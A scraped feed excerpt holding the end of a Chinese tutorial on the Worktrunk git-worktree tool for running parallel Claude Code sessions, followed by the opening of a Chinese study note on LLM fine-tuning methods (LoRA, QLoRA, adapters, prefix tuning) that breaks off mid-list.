<h4 data-id="heading-21">手动设置状态标记</h4>
<p>除了自动追踪 Claude 状态,你也可以手动给 worktree 设置任何标记，用于其他工作流：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 给当前分支设置标记</span>
wt config state marker <span class="hljs-built_in">set</span> <span class="hljs-string">"🚧"</span>

<span class="hljs-comment"># 给指定分支设置标记</span>
wt config state marker <span class="hljs-built_in">set</span> <span class="hljs-string">"✅"</span> --branch feature

<span class="hljs-comment"># 直接操作 Git Config (高级用法)</span>
git config worktrunk.state.feature.marker <span class="hljs-string">'{"marker":"💬","set_at":0}'</span>
</code></pre>
<h4 data-id="heading-22">Statusline 状态栏</h4>
<p><code>wt list statusline --claude-code</code> 可以输出一行紧凑的状态信息,用于 Claude Code 的状态栏显示:</p>
<pre><code class="hljs language-plain" lang="plain">~/w/myproject.feature-auth !🤖 @+42 -8 ↑3 ⇡1 ● | Opus
</code></pre>
<h2 data-id="heading-23">LLM Commit Messages 自动生成提交信息</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fllm-commits%2F" target="_blank" title="https://worktrunk.dev/llm-commits/" ref="nofollow noopener noreferrer">LLM Commit Messages | Worktrunk</a></p>
<p>Worktrunk 可以调用 LLM 自动生成 commit message，集成在 <code>wt merge</code>、<code>wt step commit</code>、<code>wt step squash</code> 等命令中。</p>
<p>不配置也能用，默认会基于文件名生成简单的 message，但配置 LLM 后能生成更有意义的提交信息。</p>
<h3 data-id="heading-24">安装与配置</h3>
<p><strong>1. 安装 llm 工具</strong></p>
<p>使用的是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fllm.datasette.io%2F" target="_blank" title="https://llm.datasette.io/" ref="nofollow noopener noreferrer">llm</a>：</p>
<pre><code class="hljs language-bash" lang="bash">uv tool install -U llm
<span class="hljs-comment"># 或者直接 brew</span>
brew install llm
</code></pre>
<p><strong>2. 配置 API Key</strong></p>
<p>选择你喜欢的 LLM 提供商：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 Claude (推荐)</span>
llm install llm-anthropic
llm keys <span class="hljs-built_in">set</span> anthropic
<span class="hljs-comment"># 输入你的 Anthropic API Key</span>

<span class="hljs-comment"># 或者使用 OpenAI</span>
llm keys <span class="hljs-built_in">set</span> openai
<span class="hljs-comment"># 输入你的 OpenAI API Key</span>
</code></pre>
<p><strong>3. 配置 Worktrunk</strong></p>
<p>创建配置文件（如果还没有）：</p>
<pre><code class="hljs language-bash" lang="bash">wt config create
</code></pre>
<p>编辑 <code>~/.config/worktrunk/config.toml</code>，添加：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[commit-generation]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"llm"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-m"</span>, <span class="hljs-string">"claude-3-5-haiku-latest"</span>]  <span class="hljs-comment"># 或 gpt-4o-mini</span>
</code></pre>
<h3 data-id="heading-25">使用场景</h3>
<p>配置完成后，以下命令会自动生成 commit message：</p>
<p><strong>场景 1: 合并分支时生成 squash commit</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ wt merge
◎ Squashing 3 commits into a single commit (5 files, +48)...
◎ Generating squash commit message...
   feat(auth): Implement JWT authentication system

   - Add JWT token generation and validation
   - Implement refresh token mechanism
   - Add middleware <span class="hljs-keyword">for</span> protected routes
</code></pre>
<p><strong>场景 2: 提交当前变更</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ wt step commit
◎ Generating commit message...
   fix(api): Handle null response <span class="hljs-keyword">in</span> user endpoint
</code></pre>
<p><strong>场景 3: 把多个 commit 压缩成一个</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ wt step squash
◎ Squashing 5 commits...
◎ Generating squash commit message...
   refactor(ui): Modernize component architecture
</code></pre>
<h3 data-id="heading-26">使用其他 AI 工具</h3>
<p>除了 <code>llm</code>，任何能从 stdin 读取提示词并输出文本的工具都行：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-comment"># 使用 aichat</span>
<span class="hljs-section">[commit-generation]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"aichat"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-m"</span>, <span class="hljs-string">"claude:claude-3-5-haiku-latest"</span>]

<span class="hljs-comment"># 使用自定义脚本</span>
<span class="hljs-section">[commit-generation]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"./scripts/generate-commit.sh"</span>
</code></pre>
<h3 data-id="heading-27">Fallback 行为</h3>
<p>如果没配置 LLM，Worktrunk 会生成基于文件名的简单 message：</p>
<pre><code class="hljs language-plain" lang="plain">Changes to auth.rs &amp; config.rs
</code></pre>
<h2 data-id="heading-28">CI 状态集成</h2>
<p>如果你用 GitHub Actions,Worktrunk 可以在 <code>wt list</code> 里显示构建状态:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 配置 GitHub Token</span>
wt config github.token <span class="hljs-string">"ghp_xxxxxxxxxxxx"</span>

<span class="hljs-comment"># 之后 wt list 就会显示 CI 状态</span>
wt list
</code></pre>
<h2 data-id="heading-29">实战工作流</h2>
<h3 data-id="heading-30">并行跑多个 Claude Code</h3>
<p>假设你在用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzellij.dev%2F" target="_blank" title="https://zellij.dev/" ref="nofollow noopener noreferrer">Zellij</a> 或 Tmux 管理多个终端窗口:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Pane 1: 修 bug</span>
wt switch -c -x claude fix-login-bug

<span class="hljs-comment"># Pane 2: 重构</span>
wt switch -c -x claude refactor-utils

<span class="hljs-comment"># Pane 3: 新功能</span>
wt switch -c -x claude feat-export
</code></pre>
<p>每个 Claude 在独立目录里工作,你可以随时切回主目录看全局状态:</p>
<pre><code class="hljs language-bash" lang="bash">wt switch main
wt list
</code></pre>
<h3 data-id="heading-31">临时验证想法</h3>
<p>有时候你想快速验证一个想法,但不想污染当前分支:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建临时 worktree</span>
wt switch -c -x code experiment

<span class="hljs-comment"># 验证完毕,直接删掉</span>
wt remove
</code></pre>
<p>因为 worktree 是独立目录,删掉不会影响其他分支。</p>
<h3 data-id="heading-32">Review PR 时跑代码</h3>
<p>有 PR 来了,你想在本地跑一下代码:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基于 PR 分支创建 worktree</span>
wt switch -c review-pr-123 -b origin/pr-123

<span class="hljs-comment"># 装依赖、跑测试</span>
npm install
npm run <span class="hljs-built_in">test</span>

<span class="hljs-comment"># Review 完毕,清理</span>
wt remove
</code></pre>
<h2 data-id="heading-33">参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2F" target="_blank" title="https://worktrunk.dev/" ref="nofollow noopener noreferrer">Worktrunk 官网</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering%2Fclaude-code-best-practices" target="_blank" title="https://www.anthropic.com/engineering/claude-code-best-practices" ref="nofollow noopener noreferrer">Anthropic - Claude Code Best Practices</a> (官方推荐的 worktree 工作流)</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fincident.io%2Fblog%2Fshipping-faster-with-claude-code-and-git-worktrees" target="_blank" title="https://incident.io/blog/shipping-faster-with-claude-code-and-git-worktrees" ref="nofollow noopener noreferrer">incident.io - Shipping faster with Claude Code and Git Worktrees</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgit-scm.com%2Fdocs%2Fgit-worktree" target="_blank" title="https://git-scm.com/docs/git-worktree" ref="nofollow noopener noreferrer">Git Worktree 官方文档</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[微调方法学习总结(万字长文！)]]></title>    <link>https://juejin.cn/post/7589903499599462454</link>    <guid>https://juejin.cn/post/7589903499599462454</guid>    <pubDate>2026-01-01T10:08:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599462454" data-draft-id="7589893746080743465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="微调方法学习总结(万字长文！)"/> <meta itemprop="keywords" content="算法"/> <meta itemprop="datePublished" content="2026-01-01T10:08:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="矮人三等"/> <meta itemprop="url" content="https://juejin.cn/user/4350105576808472"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            微调方法学习总结(万字长文！)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4350105576808472/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    矮人三等
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:08:04.000Z" title="Thu Jan 01 2026 10:08:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读38分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">1 什么是微调？</h4>
<ul>
<li>微调是基于已训练好的模型（通常是大型预训练模型）作为基础，在新的数据集上进一步训练模型，以适应特定应用场景</li>
<li>非必要不微调：
<ul>
<li>成本高:需要大量GPU资源和时间</li>
<li>技术门槛高:需要懂机器学习、数据处理、模型训练</li>
<li>数据要求严格:需要高质量、大量的训练数据</li>
<li>维护复杂:模型更新后需要重新微调</li>
</ul>
</li>
</ul>
<h4 data-id="heading-1">2 为什么要微调？</h4>
<ul>
<li>预训练模型是 “通用学习，普而不精”，微调可以将处理通用任务的能力在特定领域上增强</li>
<li>弥补预训练的 “知识滞后”，预训练模型有 “知识截止日期”（比如 GPT-4 截止 2023 年），没法知道最新信息（比如 2025 年新法规、新产品）；通过微调灌入最新数据，就能让模型掌握实时知识，不用等模型重新预训练。</li>
<li>数据安全方面：很多企业数据不能外传，没法用公有云大模型；微调可以把预训练模型部署在本地，用私有数据微调，全程数据不外流，符合合规要求</li>
<li>降低成本：
<ul>
<li>从零开始训练大模型成本会非常巨大，而基于现成预训练模型，只优化少量参数（尤其 PEFT），单张 4090 就能调 7B 模型，几天就能落地，成本极低。</li>
<li>prompt 工程终究是有上限的，当遇到小样本场景，专业场景，复杂对话情况时候，prompt 很难包含所有情况和细节，输出也不稳定</li>
<li>微调能精准定制模型的输出风格、能力边界，满足个性化需求。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-2">3 微调方法：</h4>
<ol>
<li>
<p>全参数微调：full fine turning 涉及调整所有层和参数，以适配特定任务。此过程通常采用较小的学习率和特定任务的数据，可以充分利用预训练模型的通用特征，但可能需要更多计算资源。</p>
</li>
<li>
<p>参数高效微调PEFT： parameterEffecict tuning  旨在通过最小化微调参数数量和计算复杂度，提升预训练模型在新任务上的表现，从而减轻大型预训练模型的训练负担。即使在计算资源受限的情况下，PEFT技术也能够利用预训练模型的知识快速适应新任务，实现有效的迁移学习
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aa4b56ed9c34fb2b144df8082f4145f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=7UvlFd2VcDEBfmbY7zg%2FB8hlQ9Y%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h4 data-id="heading-3">1 LoRA(Low-Rank Adaptation，PEFT的代表,<strong>全场景通用，推理最快，分类 / 生成效果都好</strong>)：</h4>
<ol>
<li>是一种旨在微调大型预训练语言模型（如GPT-3或BERT）的技术。其核心理念在于，在模型的决定性层次中引入小型、低秩的矩阵来实现模型行为的微调，而无需对整个模型结构进行大幅度修改(精准打补丁)。这种方法的优势在于，在不显著增加额外计算负担的前提下，能够有效地微调模型，同时保留模型原有的性能水准。</li>
<li>操作流程如下：
<ol>
<li>确定预训练模型中，要插入 loRA 矩阵的位置：
<ol>
<li>一般插入都在 Q/V 层，Q 决定 “关注什么”，V 决定 “怎么用关注到的信息”，两者直接控制注意力输出；K 仅影响匹配方式，调整 Q/V 通常已足够，通常：先试 Q+V → 效果不够再加 K → 仍不足再加 FFN，逐步验证收益</li>
</ol>
</li>
<li>引入两个低秩矩阵：
<ol>
<li>引入两个维度较小的低秩矩阵A和B(初始的 A 和 B 是随机的)。假设原始权重矩阵的尺寸为dd，则A和B的尺寸可能为dr和rd，其中r远小于d。</li>
<li>r 的取值通常根据任务难度，从简单-&gt;通用-&gt;复杂：4,8,16</li>
</ol>
</li>
<li>低秩更新：通过这两个低秩矩阵的乘积AB来生成一个新矩阵，其秩（即r）远小于原始权重矩阵的秩。这个乘积实际上是对原始权重矩阵的一种低秩近似调整。
<ol>
<li>使用 LoRA 微调的时候，冻结预训练模型所有权重参数保证模型本身能力不受影响，使用新生成的标注数据训练模型，这样就可以秩训练引入的两个低秩矩阵。</li>
</ol>
</li>
<li>最终输出所用权重：新权重 = 原始权重 + A * B * α/r。 [ r≪min(d,k) ]，r 就是低秩矩阵的r，阿尔法是缩放系数，通常是 r 的 2-4 倍</li>
<li>调参技巧：
<ol>
<li><strong>r 过大</strong>：参数增多、过拟合风险上升，显存占用增加</li>
<li><strong>r 过小</strong>：表达能力不足，任务适配效果差</li>
<li><strong>α/r 异常</strong>：过大易梯度爆炸，过小 LoRA 更新被忽略；建议固定 α/r≈2，再调 r</li>
</ol>
</li>
</ol>
</li>
<li>主要优势: 具有极高的参数效率，训练参数量可降至全量微调的0.01%甚至更少，不会产生推理延迟，同时支持多任务快速切换，可以为不同任务训练不同的LoRA"补丁"实现快速加载。</li>
<li>适用场景：当我们想在单张消费级显卡上，使用几千条指令数据将一个7B规模的模型微调成一个遵从人类指令的对话助手时，使用LoRA可以在几个小时内高效完成，并获得媲美全参数微调的效果。（典型数据：RTX 4090训练7B模型约2小时。）</li>
</ol>
<h4 data-id="heading-4">2 QLoRA(极致压缩方案)：一种结合了LoRA（Low-Rank Adaptation）方法与深度量化技术的高效模型微调手段</h4>
<ol>
<li>QLoRA = <strong>4bit/8bit 量化 + LoRA</strong>，本质就是先把原模型 “压缩瘦身”，再插 LoRA 低秩矩阵微调，既继承 LoRA “只练小矩阵” 的优点，又进一步砍显存占用，门槛直接降到普通人能承受
<ol>
<li>只压缩原模型、不碰 LoRA 精度、不改变权重形状</li>
<li>4 bit 的时候是 NF4(NormalFloat 4：正太分档),8bit 的时候是 INT8(均匀分档) /FP8(浮点格式)</li>
<li>NF4（专门为模型权重设计的压缩格式），步骤像给数据 “分档收纳”：
<ol>
<li><strong>先归一化</strong>：把原模型 FP32 权重缩放到 [-1,1] 区间，适配 NF4 的分档范围；</li>
<li><strong>分档映射</strong>：按正态分布分 16 个档位（4bit 能表示 16 个值），把权重映射到最近档位，比如 0.3→0.298、-0.5→-0.525，用 4bit 存档位编号；</li>
<li><strong>动态反量化</strong>：计算(模型推理)时临时解压缩回 FP16/BF16，保证计算精度；</li>
<li><strong>双重量化</strong>（可选）：对量化用的缩放因子(就是除了权重外的其他参数系数)再压缩到 8bit，进一步省显存。</li>
<li><strong>和普通 4bit 的区别</strong>：普通 INT4 是均匀分档（比如 - 8 到 7），中间和两头精度一样，对权重来说浪费档位；NF4 是 “按需分配”，信息损失更小。</li>
<li>没有 “NF8” 标准，因为 8bit 本身精度足够，不需要像 NF4 那样定制分档。</li>
<li>4bit 是 “紧身收纳盒”（省空间但要精准摆放），8bit 是 “宽松收纳盒”（稍占空间但不容易乱）</li>
</ol>
</li>
<li>FP16 和 BF16 的区别：
<ol>
<li>像 “精准的实验室天平”，能称出 0.001 克的差异，但最多只能称 65 公斤（超了就爆）；</li>
<li>像 “工业地磅”，能称几十吨的重物（范围大），但称 0.001 克就不准了。</li>
<li>核心：两者都是 16 位（占一样的空间），只是 “精准度” 和 “量程” 二选一。</li>
<li>BF16（Brain Float 16）是谷歌专为 AI 训练设计的，么有 BF32，32 位已经满足了足够精度了，就像上面没有 NF8 一样，因为不需要</li>
</ol>
</li>
</ol>
</li>
<li>QLoRA流程：
<ol>
<li>准备原材料：同样是需要准备预训练模型，特定的标注数据，普通硬件</li>
<li>降低精度：
<ol>
<li>原模型默认是 32bit 高精度，像一本厚字典，占地方（费显存）</li>
<li>QLoRA 先把原模型<strong>压缩成 4bit/8bit 低精度</strong>，相当于把厚字典印成小字薄本，页数少了一半多，占地方大大减少</li>
<li>插入 LoRA 的低秩矩阵(精度 FP16，本来就是这个精度)</li>
<li>训练低秩矩阵进行微调</li>
</ol>
</li>
</ol>
</li>
<li>主要优势：极低的内存消耗，使得在单张24GB显存的GPU上微调650亿参数的模型成为可能，同时通过创新的量化与反量化策略，性能损失极小。</li>
<li>场景：当我们需要对一个超大规模模型（如33B/65B）进行算法研究或轻量实验，但只有有限的GPU资源时，QLoRA是唯一能在如此苛刻条件下完成微调的可行方案。相比LoRA显存占用再降65%。</li>
</ol>
<h4 data-id="heading-5">3 适配器调整(模块化处理): adapter tuning(<strong>多任务时，不同任务的特征隔离性更好（不容易串任务）</strong>)：</h4>
<ol>
<li>与LoRA技术类似，适配器调整的目标是在保留预训练模型原始参数不变的前提下，使模型能够适应新的任务。</li>
<li>核心优势是<strong>参数少、显存省、切换任务灵活</strong>，适合资源有限又要做多任务的场景。</li>
<li>调整流程：
<ol>
<li>加载预训练模型</li>
<li>插入适配器模块，在模型的关键层插入小网络，结构像 “漏斗”：降维→激活→升维（如输入 768 维→压缩到 64 维→ReLU 激活→恢复 768 维），参数量仅为全量原模型的 1%-5%。
<ol>
<li>插件就是<strong>3 层极简的小神经网络</strong>，结构像 “漏斗”(通常是两层的 MLP)</li>
<li>核心作用是 “加工特征”，降维的目的是为了减少参数量，和低秩的道理一样，低秩低维就可以满足需求</li>
<li>ReLU 激活函数的作用：给网络加「非线性能力」，让它能学复杂规律，通俗讲更像是一个去弱留强的筛选器</li>
<li>插入位置：
<ol>
<li>首选位置：注意力层（Attention）→ 前馈层（FFN）之间（最常用，效果最好）</li>
<li>次选位置：前馈层（FFN）→ 层归一化（LayerNorm）之间</li>
<li>注：<strong>每一层插一个插件</strong>，比如 Llama 2 有 32 层，就插 32 个一模一样的插件（初始化因为是随机数所以不同，训练后各自学不同层的特征，所以每层训练出来的插件结果也不同）</li>
</ol>
</li>
<li>如何升维降维：
<ol>
<li>降维矩阵 W_down ∈ R^{m×d}（m 为瓶颈维，d 为原特征维）：用<strong>随机高斯分布</strong>初始化（均值 0、方差小，避免初始影响过大）；</li>
<li>升维矩阵 W_up ∈ R^{d×m}：用<strong>零矩阵</strong>初始化，确保训练初期 Adapter 近似恒等映射，不破坏原模型输出；</li>
<li><strong>与 LoRA 的区别</strong>：Adapter 是对特征做降维 - 升维，LoRA 是对权重更新做低秩分解，但两者均为新增可学习小矩阵，不改动主模型权重。</li>
<li>高维特征降维到「原维度的 1/8~1/16」最合适，不会太小装不下核心信息，又不会太大装过多的没用信息</li>
</ol>
</li>
</ol>
</li>
<li>训练插件：使用特定标注的训练数据训练，训练时只更新适配器的参数（梯度和优化器状态只算适配器）。</li>
<li>训练完只存适配器参数（几 MB 到几十 MB），推理时插回原模型即可用，换任务只需换适配器，不用重新训练整个大模型。
<ol>
<li>输出公式：h' = h + γ *  W_up * σ  * (W_down * h)
<ol>
<li>h'即为加入适配器后的输出结果</li>
<li>γ：为控制 Adapter 影响强度，部分改进工作会加入缩放系数 γ，γ通常取 1 或 0.5，防止任务特征盖过原模型通用特征。</li>
<li>up 和 down 即为上面的升维矩阵和降维矩阵，h 为原始输出结果</li>
<li>σ是非线性激活函数，通常用 ReLU/GeLU 增加表达能力</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>核心优势
<ol>
<li>参数效率：仅需训练约3-5%的额外参数</li>
<li>知识保留：最大限度保持预训练知识</li>
<li>多任务支持：可堆叠不同任务的适配器</li>
</ol>
</li>
<li>适用场景：当我们需要为一个模型同时掌握多项技能（如翻译、摘要、分类）时，可以为每个任务训练一个独立的适配器。在应用时，通过激活不同的适配器，即可让同一个模型扮演不同的专家角色，实现灵活的多任务部署。</li>
<li>下图左侧为 transform 中加入适配器位置，右侧为适配器结构
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd72f385397f4875b49961fee323c3ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=Ul%2BcS90rI2wsOab%2F1rP8zAuBYxY%3D" alt="在这里插入图片描述" loading="lazy"/></li>
</ol>
<h4 data-id="heading-6">4 前缀调整(轻量级参数优化): prefix tuning(<strong>多任务生成场景下，切换最快、参数量最少</strong>)：</h4>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/057ea6a3ef5d44cfb25e4d167ba03af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=2yvKaaiYbS9IvjnsgyxHBm2Qbjk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol>
<li>核心：<strong>在输入前加一段 “专属虚拟 token”，只训练这段 token，让模型适配任务</strong>，全程冻结原模型权重，省参数又灵活
<ol>
<li>比如：写作文时，不同主题（任务）用不同开头模板（比如议论文用 “观点 + 例子” 开头，记叙文用 “场景描写” 开头），模板写好了，后面内容自然贴合主题 —— 前缀调整就是给模型输入加 “专属开头虚拟 token”，让模型根据这段 token 输出符合任务的结果。</li>
</ol>
</li>
<li>调整步骤：
<ol>
<li>准备预训练模型</li>
<li>在输入文本的最前面，插入一段<strong>可训练的虚拟 token 序列</strong>（叫 Prefix），比如任务是 “写请假条”，就加<code>[请假条开头]</code>这样的虚拟 token（实际是向量，不是文字）。
<ol>
<li>前缀长度：一般取 10-100 个 token（远短于输入文本）；</li>
<li>关键：这段 token 是 “空白的”，需要训练学出任务专属信息。</li>
<li>前缀token 生成用高斯分布（均值 0、方差很小）进行初始化，避免初始值过大干扰原模型</li>
</ol>
</li>
<li>用任务训练数据（比如 “请假事由→请假条范文”）训练模型，但<strong>只更新前缀 token 的向量</strong>，原模型权重完全不动。
<ol>
<li>训练数据必须是 “前缀 token + 任务输入 + 任务输出” 的格式，和 T5 模型训练所用的数据格式有点像(前缀+输入)</li>
<li>核心：模型要学习 “前缀 + 输入” 和 “输出” 的对应关系，前缀负责引导任务类型。</li>
</ol>
</li>
<li>训练后，前缀 token 的向量就 “记住了任务专属规则”（比如写请假条要包含 “请假时间、事由、申请人”）用模型做任务时，在输入前加上训练好的前缀 token，模型就能输出符合任务的结果
<ol>
<li>实际使用可以把专门的前缀使用自动化的方法表示，毕竟不可能每次直接手动写前缀 token</li>
</ol>
</li>
</ol>
</li>
<li>适合的场景：首选 “生成类多任务场景”，具体包括：
<ol>
<li>文本生成：写文案、写邮件、摘要、翻译（多语言切换）；</li>
<li>结构化生成：写表格、写代码片段、生成 JSON 格式内容；</li>
<li>多任务混合：一个模型同时做 “写请假条 + 写周报 + 写产品描述” 等多个生成任务。</li>
<li>不适合：纯分类任务（比如情感分类），效果不如 LoRA/Adapter。</li>
<li>当我们面对一个通过API访问的、无法改动其权重的黑盒模型时，提示调整是唯一可行的“微调”手段。可以通过优化软提示，来让该模型更好地适应特定的任务风格或领域术语。</li>
</ol>
</li>
<li>核心优势：
<ol>
